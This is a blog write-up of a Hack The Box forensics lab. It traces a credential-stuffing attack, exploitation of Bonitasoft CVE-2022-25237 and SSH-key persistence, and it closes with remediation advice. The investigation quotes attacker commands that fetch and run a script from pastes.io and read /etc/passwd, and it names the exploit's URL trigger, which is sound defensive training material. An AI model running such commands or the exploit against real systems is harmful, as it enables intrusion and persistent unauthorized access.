
# **Hack The Box Sherlock Write-Ups: Meerkat | Jacob Hegy**

![](https://cdn-images-1.medium.com/max/2000/1*bNL7M0JrDG8LeRcyypR5UQ.png)

I decided to dive into one of the easier Sherlocks offered on HackTheBox: Meerkat. The premise of it is as follows:
>  As a fast growing startup, Forela have been utilising a business management platform. Unfortunately our documentation is scarce and our administrators aren’t the most security aware. As our new security provider we’d like you to take a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised.

We’re given a zip file containing a .pcap file of network traffic from the time of the suspected compromise as well as a .json file with what appears to be security events that happened within the same timeframe.

Let’s dive in!

## Table of Contents:
* [Getting Our Bearings](#getting-our-bearings) (Task 1)
* [Diagnosing the Problem](#diagnosing-the-problem) (Tasks 2-4)
* [Following the Breadcrumbs](#following-the-breadcrumbs) (Tasks 5-11)
* [Post-Compromise](#post-compromise)
* [What Actually Happened?](#what-actually-happened)
* [What Now?](#what-now)
* [Conclusion](#conclusion)

[Download necessary tools here](https://github.com/Jacob-Hegy/HTB-Write-Ups/blob/main/Tool%20List.md#meerkat)

## Getting Our Bearings

Starting with our .pcap file, we can pop that open in Wireshark and check the Endpoints table to get a feel for what IP addresses may be involved in whatever might have happened.

![](https://cdn-images-1.medium.com/max/2022/1*_yiGLwkoGexUNlKddi7UUA.png)

Sorting by packets under the TCP table, we can see the local host 172.31.6.44 (which we can assume to be the business management platform or an endpoint within the company) is receiving a majority of its traffic on ports 37022, 8080, 61254, 61255, and 22. TCP 37022, 61254, and 61255 are not registered for any specific services, but 8080 is an HTTP alternative and 22 is for SSH. Based on this, we can reasonably assume we’re looking at a web server.

We can see additional, notable amounts of traffic from foreign hosts 54.144.148.213, 95.181.232.30, 138.199.59.221,156.146.62.213. TCP traffic to a web server in and of itself is not immediately suspicious, so we’ll just note this down for now.

Diving into the actual stream of packets, we’ll filter by **tcp.port == 8080 && ip.dst == 172.31.6.44** to take a look at some of that inbound traffic.

Right out the gate, we see an HTTP request that gives us some information on our web server.

![](https://cdn-images-1.medium.com/max/3824/1*gcYLsCCuTh429fL9eCAmEQ.png)

“GET /bonita HTTP/1.1” is associated with the Bonitasoft Business Process Management Software. That tells us the platform the business chose to use and a starting point when hunting for potential exploited vulnerabilities.
>  Task 1 Answer: Bonitasoft

## Diagnosing the Problem

Browsing through Wireshark some more, we can see several POST requests made to /bonita/loginservice all from the same IP address, 156.146.62.213, each within several seconds of each other.

![](https://cdn-images-1.medium.com/max/3702/1*9nu5g5X_5aUDmULrLQOWXw.png)

Digging into the form items of each request, we find different usernames and passwords being submitted.

![](https://cdn-images-1.medium.com/max/2844/1*7WJPS_BuXZPAugY51XThog.png)

![](https://cdn-images-1.medium.com/max/2830/1*GowpB_g7zXlGwizYawVRpw.png)

Based on all the traffic originating from the same IP address and the rate at which they’re being submitted, this is likely a brute force attack. Specifically, based on the usage of *sets* of credentials as opposed to testing multiple usernames with a single password at a time or vice versa, we can conclude this is a credential stuffing attack.
>  Task 2 Answer: Credential Stuffing

Switching gears to our JSON file, we can start looking for alerts that document this attack by searching for instances of “Login”. Luckily for us, we get a pretty strong lead immediately.

![](https://cdn-images-1.medium.com/max/2000/1*dirbHd5k44W6-QbapQENEQ.png)

Investigating CVE-2022–25237, we find a critical vulnerability affecting Bonita Web 2021.2, confirming that this is likely tied to the POST requests we saw earlier.

![](https://cdn-images-1.medium.com/max/2574/1*KMUHhwnfIM2j7MVynbj8Fw.png)
>  Task 3 Answer: CVE-2022–25237

The vulnerability works by adding “i18ntranslation” in one of two variations to the end of a URL, resulting in access to privileged API endpoints that could lead to remote code execution.
>  Task 4 Answer: i18ntranslation

## Following the Breadcrumbs

Digging back into Wireshark, we sort with the filter **http **to get a better handle on the traffic that was the cause of this attack.

![](https://cdn-images-1.medium.com/max/3730/1*4IVwCVSYONvP9pddrCz4yQ.png)

We find a stream of POST requests, each followed by a 401 code, meaning invalid credentials. In total, 56 unique sets of username-password combinations were used.
>  Task 5 Answer: 56

Eventually, there’s an anomaly in the stream of POST requests.

![](https://cdn-images-1.medium.com/max/3824/1*4RDlp3_Q9X00bNyWBw2rEg.png)

Following a login attempt with the username “seb.broom@forela.co.uk” and the password “g0vernm3nt”, HTTP code 204 is returned, indicating a successful authentication. Four calls are then made to the Bonita API. This is indicative of the CVE we identified, suggesting that these are the credentials that were successfully compromised.
>  Task 6 Answer: seb.broom@forela.co.uk:g0vernm3nt

Following the successful authentication, the attacker performs a POST request to upload a file entitled “rce_api_extension.zip”.

![](https://cdn-images-1.medium.com/max/2304/1*h1lyQ0omQh4VdkL9n4RxsA.png)

Doing a little bit of digging, we find that zip in a [Github repository](https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2022-25237) containing the proof-of-concept created by Rhino Security Labs during the initial disclosure of the vulnerability to Bonitasoft. If we needed any additional confirmation that this attack is a result of CVE-2022–25237, this would be it.

The zip file is further interacted with by a subsequent POST request to set it properly within the web server’s storage.

![](https://cdn-images-1.medium.com/max/3256/1*mq9OGAAcpgrm9Eo14yLNaw.png)

Immediately following this upload and setup, we encounter an especially troubling GET request to the server.

![](https://cdn-images-1.medium.com/max/2304/1*amU1UevHzH6SilrbdwirDA.png)

The parameter “cmd” is set to “whoami”, a command that will tell the attacker the name of the current user they’re logged in as. Sure enough, the next HTTP packet contains the server’s response in the form of a JSON.

![](https://cdn-images-1.medium.com/max/2832/1*lIx6bKjXx1vsol4kSMe0hQ.png)

The attacker has successfully gained root access to the web server, essentially giving them full control. The attacker then deletes the zip file to remove the indicator of compromise in hopes of covering their tracks while they enumerate the web server.

Continuing our investigation, the attacker resumes testing username-password combinations before returning to the successful set of credentials.

![](https://cdn-images-1.medium.com/max/3300/1*bD_8uuF8okHXAq9nH79rOA.png)

Interestingly, the IP address of the attacker changes at this point from 156.146.62.213 to 138.199.59.221. This is possibly them changing their VPN, connecting from a different network, or changing which system their using.

Regardless, we can assume this is the same attacker or at the least someone connected to the original attacker as they pick up with the same attack the original IP address was using within one minute of the end of the brute force attack. They use the cracked credentials to log back in, reupload rce_api_extension.zip, set it up like they had before, and then execute another set of commands using a GET request. This time, they execute “cat /etc/passwd” to enumerate the usernames of all users set up on the web server as well details on each account. Then once again, they delete the zip file to cover their tracks.

This is where something new happens. The attacker once again uploads the zip file like they had previously and issues a command through a GET request, but this time the command is “wget https://pastes.io/raw/bx5gcr0et8”.

![](https://cdn-images-1.medium.com/max/2292/1*GNjjrZVowtHbx0KJY_c0tw.png)

The attacker is downloading something to the web server using the text sharing site “pastes.io”.
>  Task 7 Answer: pastes.io

Following the link in the wget, we land on a raw webpage containing the following text.

![](https://cdn-images-1.medium.com/max/2000/1*FYlyxj1zVLWQAvXc_8ZJ2A.png)

The attacker has uploaded a bash script to the web server that downloads another another text file from a separate link into the authorized ssh RSA keys before restarting the ssh service on the server. We’ll go ahead and hash this script file to add it to EDRs and other security controls later to detect any further attempts to use it.

![](https://cdn-images-1.medium.com/max/2000/1*cMG2vqYiu7ugmnK7Oy5LpA.png)
>  Task 8 Answer: 0dc54416c346584539aa985e9d69a98e
> EDIT: Task 8 was changed to ask for the file’s name
See the next task for the appropriate answer

We’ll go ahead and following the link to the other file used in the first script the attacker uploaded. Going to that webpage, we’re once again met with raw text.

![](https://cdn-images-1.medium.com/max/3354/1*ZI42hbt2-jw0ORotDRalOg.png)

What’s happened is the attacker has successfully uploaded a known RSA key to the authorized ssh keys on the web server. Doing this enables them to connect to the web server over ssh using the matching private key, granting persistence.

We’ll hash this file as well to add to our filters.

![](https://cdn-images-1.medium.com/max/2000/1*2yJD9IeQuyqP15IY6UhW0A.png)
>  Task 9 Answer: hffgra4unv

Reviewing the previous file we analyzed, we can see that the new SSH key was being append to the keys stored in /home/ubuntu/.ssh/authorized_keys.
>  Task 10 Answer: /home/ubuntu/.ssh/authorized_keys

Looking into MITRE’s ATT&CK Matrix, we find a TTP that matches up with the attacker’s actions: SSH Authorized Keys (T1098.004) under Account Manipulation in the Persistence column.

![](https://cdn-images-1.medium.com/max/2000/1*oyg908Qvle7Ucj12oVc_Bg.png)
>  Task 11 Answer: T1098.004

**For those of you just here for the answers to the Sherlock, you can stop here. However, I want to dive a bit deeper into the actual actions of the attacker after establishing persistence as well as possible approaches to remediation the client can perform during recovery efforts.**

## Post-Compromise

The attacker proceeds deletes and reuploads the rce_api_extension.zip file once more. They then issue the command “bash bx5gcr0et8”, executing the shell script they downloaded from the first pastes.io link. This causes the planted public key to be added to /.ssh/authorized_keys and the ssh service to restart.

![](https://cdn-images-1.medium.com/max/3712/1*6VjanvKxZE_04CgRcNAQhg.png)

One last time, the attacker deletes the zip file to cover their tracks. But we now encounter an anomaly in our packet flow. There’s a jump in time, then traffic from a new IP address that issues commands that result in the downloading of Nmap to the system. We’ll come back to the usage of Nmap in a moment, but first we’ll jump over the TCP traffic to see if the attacker made us of their newly established ssh access.

Applying the filter “tcp.dstport == 22” we find exactly what we’re looking for.

![](https://cdn-images-1.medium.com/max/3736/1*Bl7G38w_kb7MNkmZbx6qtw.png)

Immediately following the attacker executing the script to modify the authorized ssh keys, a new ssh connection is established. Once again, we’re faced with a new IP address, 95.181.232.30, but same as last time we can pretty easily conclude that this is the same attacker based on the tight timeframe and order of events.

The attacker communicates with the web server at the time of the HTTP traffic we saw earlier, suggesting that they issued commands for the web server to download several packages, including Nmap.

![](https://cdn-images-1.medium.com/max/2294/1*TWRu01dYcsfhMRbxXpPQ_g.png)

Following these successful downloads, we see the attacker begin using their new tools within the network as they perform port enumeration on the IP address 34.207.150.13.

![](https://cdn-images-1.medium.com/max/3750/1*i-l1lRAM8F38xmRvXpz2FA.png)

This continues for awhile until the attacker finally disconnects from the ssh session with the web server, concluding our packet capture.

![](https://cdn-images-1.medium.com/max/3710/1*K10YFgKjpWA7OgdZvx1l_g.png)

## What Actually Happened?

We’ve covered a lot, so let’s recap:

* A foreign IP address performed a credential stuffing attack against the web server located at 172.31.6.44. The origins of their list of credentials is unknown.

* The attacker successfully authenticated with the web server with the credentials “seb.broom@forela.co.uk:g0vernm3nt”.

* Following establishment of initial access, the attacker used CVE-2022–25237 to exploit a vulnerability in ≤ Bonita Web 2021.2 that allows access to privileged API usage. The attacker used this to upload a “rce_api_extension.zip” to the web server, test their access level, and subsequently cover their tracks by deleting the file.

* This process of uploading the zip, command issuing, and deleting the zip were repeated several times as the attacker used pastes.io to upload a shell script to the web server that added a new RSA public key to /.ssh/authorized_keys which enabled ssh access to the web server to the attacker.

* The attacker then connected over ssh to the web server, downloaded several packages including Nmap, and proceeded to perform port enumeration as well as any additional scanning on the IP address 34.207.150.13. It is unknown if the attacker performed exfiltration using SFTP, SCP, or any other protocols over SSH.

* Upon completion of the Nmap scan, the attacker disconnected from the ssh session.

## What Now?

This is obviously a pretty severe breach for our client, so establishing recovery and remediation procedures is critical.

Depending on the client’s ability to maintain availability of their business management platform with another server, the affected web server should be immediately quarantined and removed from outside access.

Forensic copies of the information on the server should be created immediately to allow for further investigation into the incident as well as a chain-of-custody established to enable proper documentation of the evidence.

Regarding recovery the web server itself and securing it, there are several necessary actions:

* If possible, rebuild the affected web server. It is unknown what actions the attacker undertook during their unimpeded access to the web server thus it is unsafe to continue using the current build. This rebuild should include updating the Bonitasoft Business Process Management Software version used on the web server to prevent the exploitation of CVE-2022–25237. If such an update is impossible due to some limitation or necessity for that specific version of Bonitasoft, consider implementing a WAF to scan for regular expressions containing “i18ntranslation” and block them.

* The foreign ssh key should be removed immediately. Additionally, replacing all current ssh keys should be considered as it should be assumed the attacker was able to access all the saved keys and could easily just reconnect to the server using one of the legitimate keys.

* All employees with access to the web server should update their usernames (recommended) and passwords (mandatory). Additionally, password requirements should be updating and enforced. The compromised password “g0vernm3nt” only contains lowercase letters and numbers. This is not a secure password. Even if the attacker did not have access to it for a credential stuffing attack, dictionary attack could have just as easily worked. Implementing requirements such as “12 character minimum length, lower- and uppercase letters, numbers, and symbols all required” could make a brute force attack much more difficult.

* Notify the owner of the system at 34.207.150.13 regarding the scanning performed against them. This will enable them to take proper action in accordance with their respective security policies.

* Block all traffic from the following IPs: 156.146.62.213, 138.199.59.221, 95.181.232.30.

* Notify any relevant stakeholders depending on the possible level of information compromise and affected parties.

* Implement an authentication cooldown on repeated login attempts from the same IP address to slow down future brute force attacks.

* Several hosts were reached out to from the web server following ssh access by the attacker. The systems at the following IP addresses should additionally be notified/investigated depending on ownership for additonal IOCs: 221.152.214.70, 162.142.125.179, 176.111.174.81, 162.142.125.176, 193.163.125.71, 89.248.165.187.

* Perform proper security awareness training with all IT and security staff, particularly administrators to prevent future incidents from transpiring and to increase the chance that any attacks are caught early and proper incident response procedures are followed.

* Update security documentation to reflect the proper procedures following an incident, the delegation of authority, and the recovery process. Have updated documentation signed off on by highest possible authority.

Following these recommendations should enable the recovery of the web server as well as the discovery of any additional IOCs, a clearer picture of the attacker’s exact actions, and the full scope of the incident.

The recovery plan should be modified as the forensic/incident response process proceeds to properly reflect the most relevant information as time goes on.

## Conclusion

I had a ton of fun with this sherlock! It was fairly easy, but it offered a good opportunity to engage in incident response procedures and map out a simulated attack. The additional practice offering recovery recommendations was the icing on the cake.

Thanks for reading! I’ll be trying to publish more write-ups as I continue to go through various sherlocks, so check back later!
